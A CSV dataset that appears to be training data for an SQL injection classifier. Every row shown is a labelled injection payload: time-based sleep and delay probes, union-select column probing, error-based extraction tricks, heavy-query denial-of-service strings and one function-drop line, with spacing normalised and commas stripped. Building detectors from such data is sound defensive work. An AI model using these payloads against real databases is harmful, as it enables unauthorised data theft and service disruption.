Sentence,Label
-6095'  )   or 6872  =  6872 and   (  'bfwm' like 'bfwm,1
1' where 5004  =  5004 or 7552  =    (  select count  (  *  )   from rdb$fields as t1rdb$types as t2rdb$collations as t3rdb$functions as t4  )  --,1
1'||  (  select 'cqjw' from dual where 7335  =  7335 and 8514  =    (  select count  (  *  )   from domain.domains as t1domain.columns as t2domain.tables as t3   )    )   ||',1
"1""   )    )     )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (     (  ""ipqw"" like ""ipqw",1
select   (  case when   (  2394  =  4530  )   then 2394 else 2394*  (  select 2394 from information_schema.character_sets  )   end  )  #,1
1 procedure analyse  (  extractvalue  (  9627concat  (  0x5c  (  benchmark  (  5000000md5  (  0x4b774c75   )    )      )    )     )  1  )  #,1
1 or elt  (  6272  =  6272sleep  (  5   )    )   -- ilfc,1
-3862   )    )    as vqtl where 9629  =  9629 union all select 96299629962996299629--,1
"1"" where 3227  =  3227 waitfor delay '0:0:5'--",1
-8002'   )    )     )   union all select 664766476647--,1
select   (  case when   (  9732  =  7136  )   then 9732 else 9732*  (  select 9732 from information_schema.character_sets  )   end  )  #,1
-1998'  )   as kgvf where 2346  =  2346 union all select 234623462346234623462346234623462346--,1
1%'   )    )    union all select nullnull#,1
-9596  )   where 3425  =  3425 union all select 342534253425342534253425#,1
" end and   (  ""nuix"" like ""nuix",1
1' and   (  3020  =  3020  )  *6703 and 'tmng' like 'tmng,1
1   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,1
1'   )    )     )   or 8384  =  like  (  'abcdefg'upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  'jueq'  =  'jueq,1
1' and sleep  (  5  )   and 'usgv' like 'usgv,1
"1%""   )    )    and 2006  =  2006",1
"1""   )    )    as ktue where 6392  =  6392 and 8514  =    (  select count  (  *  )   from domain.domains as t1domain.columns as t2domain.tables as t3  )  --",1
waitfor delay '0:0:5' and    (    (     (  '%'  =  ',1
"-8777""  )   as lalf where 8606  =  8606 or elt  (  4397  =  58235823  )  --",1
"1""   )    )     )   or 1022  =    (  select count  (  *  )   from all_users t1all_users t2all_users t3all_users t4all_users t5  )  --",1
1   )    )    as huxq where 7451  =  7451 union all select nullnullnull--,1
-9531'   )    )     )   union all select 40764076#,1
-8924   )    )    as jybr where 7901  =  7901 or elt  (  1032  =  10323623  )  --,1
"1""  )   union all select nullnullnullnull#",1
"1"" or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71  (  select   (  elt  (  8113  =  81131   )    )     )  0x717a767a710x78   )    )   s  )   8446744073709551610 8446744073709551610   )    )     )   and ""uqor"" like ""uqor",1
select   (  case when   (  9667  =  6212  )   then 9667 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1
-5379'  )   union all select 429442944294--,1
1  )   where 6990  =  6990 and 2716  =    (  select count  (  *  )   from sysusers as sys1sysusers as sys2sysusers as sys3sysusers as sys4sysusers as sys5sysusers as sys6sysusers as sys7  )  --,1
1  )   as kaew where 2658  =  2658,1
-6588' where 7793  =  7793 or   (  8459  =  8459  )  *4906--,1
1' in boolean mode  )   or row  (  10457562  )  >  (  select count  (  *  )  concat  (  0x7171706a71  (  select   (  elt  (  1045  =  10451   )    )     )  0x717a767a71floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  #,1
1'||  (  select 'miew' where 8360  =  8360 waitfor delay '0:0:5'  )  ||',1
"-5672%"" or 3825  =  9675--",1
1' where 2547  =  2547 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --,1
select sleep  (  5  )   and    (    (   '%'  =  ',1
select   (  case when   (  3537  =  5218  )   then 3537 else 3537*  (  select 3537 from mysql.db  )   end  )  #,1
1 and 5934  =  7745,1
-4960'  )   union all select 5300--,1
1'   )    )    or sleep  (  5  )  #,1
1 and 3580  =    (  select count  (  *  )   from domain.domains as t1domain.columns as t2domain.tables as t3  )  --,1
1  )   or sleep  (  5  ) ,1
"1""   )    )    and 8407  =    (  select count  (  *  )   from generate_series  (  15000000   )    )    and    (    (   ""tfrs""  =  ""tfrs",1
1%'  )   and 4241  =  convert  (  int  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  '%'  =  ',1
1'  )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71  (  select   (  elt  (  3484  =  34841   )    )     )  0x717a767a710x78   )    )   s  )   8446744073709551610 8446744073709551610   )    )     )   and   (  'fnjm'  =  'fnjm,1
"-5622"" where 7970  =  7970 union all select 79707970797079707970--",1
1' and updatexml  (  3393concat  (  0x2e0x7171706a71  (  select   (  elt  (  3393  =  33931   )    )     )  0x717a767a71  )  1161  )   and 'kird'  =  'kird,1
1  )   or 5286  =    (  select count  (  *  )   from all_users t1all_users t2all_users t3all_users t4all_users t5  )   and   (  4976  =  4976,1
"-1263""  )   or 9323  =  9323#",1
select   (  case when   (  9318  =  7198  )   then 9318 else 9318*  (  select 9318 from information_schema.character_sets  )   end  )  #,1
1' rlike sleep  (  5  )   and 'cugs'  =  'cugs,1
1 where 7224  =  7224 and sleep  (  5  )  #,1
-1985   )    )     )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (     (  1248  =  1248,1
1' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and 'mabd'  =  'mabd,1
1'   )    )    as xpmy where 5274  =  5274 rlike   (  select   (  case when   (  6252  =  7704  )   then 1 else 0x28 end   )    )   --,1
1'   )    )    and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   'nuis'  =  'nuis,1
1  )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  ) ,1
"1"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  5  )   and ""kfps""  =  ""kfps",1
"1""  )   where 6311  =  6311",1
-7423 or make_set  (  9354  =  93547185  )  -- hprc,1
1'+  (  select taga where 8036  =  8036,1
"1%"" and extractvalue  (  7982concat  (  0x5c0x7171706a71  (  select   (  elt  (  7982  =  79821   )    )     )  0x717a767a71   )    )    and ""%""  =  """,1
1'   )    )     )   and   (  select 9067 from  (  select count  (  *  )  concat  (  0x7171706a71  (  select   (  elt  (  9067  =  90671   )    )     )  0x717a767a71floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  'jicq' like 'jicq,1
 (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  5877  =  5877  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    ) ,1
"-1351"" where 6968  =  6968 or 5684  =  8582",1
"-1030"" where 2161  =  2161 union all select 2161216121612161216121612161216121612161--",1
"-4764""   )    )    or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   ""dfvz"" like ""dfvz",1
1 where 1776  =  1776 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  null  )  0  )  500000000  )  null  )  --,1
1 where 3799  =  3799 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  0  )  5000000000  )  null  )  --,1
-9672'   )    )    as rupb where 8218  =  8218 or make_set  (  4954  =  18361836  )  --,1
"1%"" and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  null  )  0  )  500000000  )  null  )  --",1
1'||  (  select 'cfff' where 4994  =  4994,1
1'+  (  select 'jtvq' where 8288  =  8288 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,1
1'+  (  select 'leok' where 4320  =  4320,1
1'+  (  select 'uijv' where 7279  =  7279 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  5  )  --,1
select count  (  *  )   from rdb$fields as t1rdb$types as t2rdb$collations as t3rdb$functions as t4 and   (  1473  =  1473,1
1%'   )    )     )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  '%'  =  ',1
"-5579%""  )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  ""%""  =  """,1
1  )   where 2734  =  2734 waitfor delay '0:0:5'--,1
1'||  (  select 'qgnz' where 6446  =  6446,1
1'   )    )    as nhkp where 8030  =  8030,1
"1%""   )    )    or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71  (  select   (  elt  (  6270  =  62701   )    )     )  0x717a767a710x78   )    )   x   )    )    and    (    (   ""%""  =  """,1
select count  (  *  )   from sysibm.systables as t1sysibm.systables as t2sysibm.systables as t3 and '%'  =  ',1
1   )    )    as gygm where 4024  =  4024,1
"-2448%""  )   or 3038  =  3038",1
1'   )    )     )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  null  )  0  )  500000000  )  null  )   and    (    (     (  'xzcr'  =  'xzcr,1
1'+  (  select ijoh where 7145  =  7145 order by 1--,1
1   )    )    as sipp where 1999  =  1999 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  --,1
"1""  )   and 3202  =  like  (  'abcdefg'upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""ikaf"" like ""ikaf",1
if  (  1087  =  5839  )   select 1087 else drop function zzeh--,1
-8753  )   order by 1#,1
1'   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1domain.columns as t2domain.tables as t3  )   and    (    (   'hfqz'  =  'hfqz,1
-1485'   )    )     )   union all select 76617661766176617661--,1
"select count  (  *  )   from sysibm.systables as t1sysibm.systables as t2sysibm.systables as t3 and   (  ""%""  =  """,1
1  )   as jqbp where 5407  =  5407 and 4595  =  4595#,1
select dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  70  )  ||chr  (  106  )  ||chr  (  78  )  5  )   from dual--,1
1%'  )   union all select nullnullnullnullnullnullnullnullnull#,1
1'+  (  select wpai where 3685  =  3685,1
-6165%'   )    )    union all select 5384#,1
1   )    )    as msug where 3503  =  3503 and sleep  (  5  )  #,1
1'   )    )     )   union all select nullnullnullnullnullnullnullnullnullnull--,1
call regexp_substring  (  repeat  (  right  (  char  (  3702  )  0  )  500000000  )  null  )   and    (    (   'frpo' like 'frpo,1
"1""  )   where 2656  =  2656 or sleep  (  5  )  --",1
-7786'   )    )    or 9323  =  9323#,1
1'||  (  select 'gwxc' from dual where 3626  =  3626 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  null  )  0  )  500000000  )  null  )  --,1
-5534 or 1983  =  5721#,1
1'   )    )    as grne where 9003  =  9003 order by 1--,1
"1"" and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  0  )  5000000000  )  null  )   and ""wrbs"" like ""wrbs",1
"1""   )    )    as hkrh where 3060  =  3060 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  0  )  5000000000  )  null  )  --",1
1'  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  0  )  5000000000  )  null  )   and   (  'rqyz'  =  'rqyz,1
"-5439"" or 2559  =  4692 and ""dcrf"" like ""dcrf",1
"1""  )   as kndn where 9314  =  9314",1
-6030%'  )   or 3038  =  3038,1
1   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  0  )  500000000  )  null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  ,1
1 and 8407  =    (  select count  (  *  )   from generate_series  (  15000000   )    )   # tqmr,1
1   )    )    as tnhy where 1874  =  1874 and 2858  =  7324#,1
-1910' or 2624  =  3371 and 'umoy'  =  'umoy,1
-7293'   )    )     )   or 3038  =  3038,1
"select sleep  (  5  )   and   (  ""%""  =  """,1
1 where 3410  =  3410 or 7552  =    (  select count  (  *  )   from rdb$fields as t1rdb$types as t2rdb$collations as t3rdb$functions as t4  )  --,1
1'   )    )    and 2388  =  benchmark  (  5000000md5  (  0x6d457153   )    )   #,1
1  )   and 3824  =  benchmark  (  5000000md5  (  0x76555642   )    )    and   (  6786  =  6786,1
select count  (  *  )   from domain.domains as t1domain.columns as t2domain.tables as t3#,1
"1%""   )    )    union all select nullnullnullnullnullnullnullnullnull#",1
1'   )    )    as lmsl where 3753  =  3753 or elt  (  5873  =  5873sleep  (  5   )    )   #,1
"1""   )    )     )   or elt  (  6272  =  6272sleep  (  5   )    )    and    (    (     (  ""hxgu""  =  ""hxgu",1
1'  )   as twny where 9580  =  9580,1
"-7738%""  )   union all select 875487548754875487548754875487548754#",1
1'   )    )     )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  0  )  500000000  )  null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and    (    (     (  'bvdw'  =  'bvdw,1
"1"" or updatexml  (  1808concat  (  0x2e0x7171706a71  (  select   (  elt  (  1808  =  18081   )    )     )  0x717a767a71  )  8666  )  ",1
"-3884"" where 8012  =  8012 union all select 80128012#",1
"1"" and extractvalue  (  7982concat  (  0x5c0x7171706a71  (  select   (  elt  (  7982  =  79821   )    )     )  0x717a767a71   )    )    and ""eiuc"" like ""eiuc",1
select sleep  (  5  )   and    (    (   'srfc' like 'srfc,1
1  )   waitfor delay '0:0:5' and   (  2993  =  2993,1
"1""  )   where 1666  =  1666 or 4411  =    (  select count  (  *  )   from sysusers as sys1sysusers as sys2sysusers as sys3sysusers as sys4sysusers as sys5sysusers as sys6sysusers as sys7  )  --",1
"1""   )    )   ",1
"-5572""  )   union all select 81318131#",1
1 where 2823  =  2823 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1sysibm.systables as t2sysibm.systables as t3  )  --,1
1' in boolean mode  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   #,1
-3026  )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    ) ,1
"1%"" and elt  (  4249  =  42497259  )   and ""%""  =  """,1
1' where 2389  =  2389 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,1
1  )   where 6788  =  6788 union all select nullnullnullnullnullnullnullnullnull--,1
-2912'   )    )    order by 1--,1
select count  (  *  )   from sysibm.systables as t1sysibm.systables as t2sysibm.systables as t3,1
"1"" union all select nullnullnullnullnull#",1
select count  (  *  )   from rdb$fields as t1rdb$types as t2rdb$collations as t3rdb$functions as t4--,1
select sleep  (  5  )  -- hlgt,1
1'   )    )     )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  null  )  0  )  500000000  )  null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and    (    (     (  'sqnk'  =  'sqnk,1
1'   )    )    as ytfi where 3323  =  3323 and 8148  =  like  (  'abcdefg'upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --,1
-4091   )    )    as lqqy where 3030  =  3030 union all select 303030303030#,1
1'  (  select   (  case when   (  8596  =  8596  )   then 1 else 8596*  (  select 8596 from mysql.db  )   end   )    )   ,1
1'   )    )     )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  'snoa'  =  'snoa,1
"1"" where 9014  =  9014 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --",1
select case when 8227  =  1229 then 1 else null end--,1
-8465' where 5242  =  5242 or 3806  =  7423--,1
"-1949""   )    )    as urke where 8761  =  8761 union all select 8761876187618761876187618761#",1
1'   )    )    as uuuk where 7234  =  7234 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  5  )  --,1
1'  )   as mqxb where 6496  =  6496 and 7533  =  7533--,1
1%' union all select nullnullnullnullnullnullnullnull--,1
1'  )   where 4298  =  4298,1
-5417 or elt  (  1032  =  10323623  )  ,1
1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1rdb$types as t2rdb$collations as t3rdb$functions as t4  )   and 'ynpr'  =  'ynpr,1
"-9978"" or make_set  (  4893  =  97659765  )   and ""mhjt""  =  ""mhjt",1
-7501'+  (  select uloc where 3089  =  3089 union all select 3089308930893089308930893089308930893089--,1
1'||  (  select 'iocs' where 9287  =  9287 and 8407  =    (  select count  (  *  )   from generate_series  (  15000000   )    )     )  ||',1
1   )    )    as khvx where 7533  =  7533 union all select nullnullnullnullnullnullnullnull--,1
1' in boolean mode  )   and 9660  =    (  select count  (  *  )   from all_users t1all_users t2all_users t3all_users t4all_users t5  )  --,1
"1""  )   as jtou where 8129  =  8129 and 7533  =  7533--",1
1  )   where 6494  =  6494,1
select count  (  *  )   from generate_series  (  15000000  )   and 'dfwj'  =  'dfwj,1
1'+  (  select luwn where 1214  =  1214 union all select nullnullnullnullnullnull#,1
1%'   )    )     )   and 2006  =  2006,1
"-7235""  )   union all select 4624462446244624462446244624462446244624#",1
-3756'  )   union all select 103410341034--,1
select sleep  (  5  )   and 'gajm'  =  'gajm,1
"1""   )    )     )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71  (  select   (  elt  (  8113  =  81131   )    )     )  0x717a767a710x78   )    )   s  )   8446744073709551610 8446744073709551610   )    )     )   and    (    (     (  ""twpn"" like ""twpn",1
"1""   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1sysusers as sys2sysusers as sys3sysusers as sys4sysusers as sys5sysusers as sys6sysusers as sys7  )   and    (    (   ""wdye"" like ""wdye",1
1'  (  select   (  case when   (  3902  =  3902  )   then   (  select count  (  *  )   from all_users t1all_users t2all_users t3all_users t4all_users t5  )   else 1/  (  select 0 from dual  )   end  )   from dual  )  ,1
-3956'  )   or   (  8459  =  8459  )  *4906 and   (  'rflo' like 'rflo,1
1iif  (  1440  =  461211/0  )  ,1
1'   )    )     )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  'gegg'  =  'gegg,1
"1%""   )    )    or 7417  =    (  select count  (  *  )   from sysibm.systables as t1sysibm.systables as t2sysibm.systables as t3  )  --",1
"1""   )    )    as uzvu where 2458  =  2458 or   (  select 9173 from  (  select count  (  *  )  concat  (  0x7171706a71  (  select   (  elt  (  9173  =  91731   )    )     )  0x717a767a71floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",1
1%'  )   and elt  (  3114  =  3114sleep  (  5   )    )   #,1
1 union all select nullnullnullnullnullnull#,1
select count  (  *  )   from generate_series  (  15000000  )   and    (    (     (  'wvzw'  =  'wvzw,1
1'  )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  5  )  ,1
1'+  (  select 'yjpp' where 8966  =  8966,1
"1%""  )   or 4411  =    (  select count  (  *  )   from sysusers as sys1sysusers as sys2sysusers as sys3sysusers as sys4sysusers as sys5sysusers as sys6sysusers as sys7  )   and   (  ""%""  =  """,1
-8266%'  )   union all select 862686268626862686268626--,1
1%'   )    )     )   and 9660  =    (  select count  (  *  )   from all_users t1all_users t2all_users t3all_users t4all_users t5  )  --,1
-2787' union all select 3622362236223622362236223622362236223622#,1
"-6359""   )    )    or elt  (  3546  =  24332433  )   and    (    (   ""qxat""  =  ""qxat",1
"1""  )   and extractvalue  (  7982concat  (  0x5c0x7171706a71  (  select   (  elt  (  7982  =  79821   )    )     )  0x717a767a71   )    )    and   (  ""rfpq""  =  ""rfpq",1
1   )    )     )   and 6358  =  6735,1
1'   )    )    as cimd where 9608  =  9608,1
1'  )   as kgnd where 1550  =  1550 and 3202  =  like  (  'abcdefg'upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --,1
1'+  (  select 'sbji' where 7989  =  7989 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo   )    )   +',1
-9690 union all select 7217#,1
1 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71  (  select   (  elt  (  8190  =  81901   )    )     )  0x717a767a710x78   )    )   x   )    )   -- dkwz,1
1' or 8315  =    (  select count  (  *  )   from sysibm.systables as t1sysibm.systables as t2sysibm.systables as t3  )   and 'eomt'  =  'eomt,1
1'  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71  (  select   (  elt  (  6270  =  62701   )    )     )  0x717a767a710x78   )    )   x   )    )    and   (  'thce'  =  'thce,1
1'   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (     (  'lajk'  =  'lajk,1
1'  )   where 1212  =  1212,1
1'||  (  select 'ggfx' where 4932  =  4932 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  5   )    )   ||',1
1'   )    )     )   and   (  1685  =  2985  )  *2985 and    (    (     (  'rzwb'  =  'rzwb,1
"1""  )   as yecj where 1194  =  1194 and 8407  =    (  select count  (  *  )   from generate_series  (  15000000   )    )   --",1
"-5411%""   )    )    or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   ""%""  =  """,1
1%' and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  null  )  0  )  500000000  )  null  )   and '%'  =  ',1
"1""  )   as crek where 6570  =  6570 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  null  )  0  )  500000000  )  null  )  --",1
"-6084""   )    )    union all select 73547354735473547354735473547354#",1
"1"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and ""kojr""  =  ""kojr",1
-4191  )   order by 1#,1
"1""  )   where 6632  =  6632 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  5  )  --",1
"1""   )    )    waitfor delay '0:0:5' and    (    (   ""witb""  =  ""witb",1
1  )   as xylu where 3338  =  3338 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  --,1
-2707'   )    )     )   or   (  8459  =  8459  )  *4906 and    (    (     (  'mwdq'  =  'mwdq,1
1  )   where 8375  =  8375,1
1' in boolean mode  )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  #,1
1' order by 1--,1
select case when 3920  =  4402 then 1 else null end--,1
1'   )    )     )   and 5615  =  5458--,1
-8810'  )   or make_set  (  9354  =  93547185  )   and   (  'prsn' like 'prsn,1
"-5706""   )    )    union all select 2013201320132013#",1
1'  )   where 9159  =  9159,1
-7860'   )    )     )   union all select 7420742074207420742074207420742074207420--,1
"-3546%"" or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and ""%""  =  """,1
1'  )   where 2928  =  2928,1
"1""   )    )    as ajwe where 1153  =  1153 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   --",1
1%'   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1domain.columns as t2domain.tables as t3  )   and    (    (   '%'  =  ',1
